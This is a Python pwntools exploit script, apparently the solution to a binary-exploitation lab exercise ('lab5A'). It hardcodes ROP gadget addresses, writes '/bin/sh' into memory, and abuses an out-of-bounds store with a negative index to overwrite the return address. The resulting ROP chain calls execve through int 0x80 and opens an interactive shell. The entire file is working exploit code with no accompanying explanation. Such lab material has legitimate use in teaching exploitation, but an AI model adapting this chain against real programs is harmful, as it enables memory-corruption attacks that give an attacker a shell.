from pwn import *
import sys
# gadgets
_add_esp_3xpop = 0x08079869
_pop_edi = 0x08096f85
_ecx_ffffffffh = 0x0805befc
_inc_ecx = 0x080e9e40
_pop_edx_xor_eax_eax_pop_edi = 0x080695a5
_ret = 0x08096f86
_add_eax_bh_pop_edi = 0x08096f82
_pop_ebx_pop_esi = 0x080bf69f
_int_80h = 0x080d92c3
addr_binsh = 0xbffff5c4
addr_binsh -= int(sys.argv[1], 16)
def store(p, idx, value, skipLastRecv = False):
    p.sendline("store")
    p.recv(100)
    p.sendline(str(value))
    p.recv(100)
    p.sendline(str(idx))
    if (not skipLastRecv): p.recv(100)
def quit_prog(p):
    
    p.sendline("quit")
p = process("./lab5A")
p.recv(500)
store(p, 31, 0x6e69622f) # store /bin/sh
store(p, 32, 0x0068732f) # at 0xbffff5e4 (gdb)
idx_ret_addr = 4294967285 # -11
idx = 1
store(p, idx, _ecx_ffffffffh) # overwrite return address
store(p, idx+1, _pop_edi)
idx += 3
store(p, idx, _inc_ecx)
store(p, idx+1, _pop_edi)
idx += 3
store(p, idx, _pop_edx_xor_eax_eax_pop_edi)
store(p, idx+1, 0x0)
idx += 3
store(p, idx, _ret)
store(p, idx+1, _add_eax_bh_pop_edi)
idx += 3
store(p, idx, _pop_ebx_pop_esi)
store(p, idx+1, addr_binsh)
idx += 3
store(p, idx, _int_80h)
store(p, idx_ret_addr, _add_esp_3xpop, True)
p.interactive()
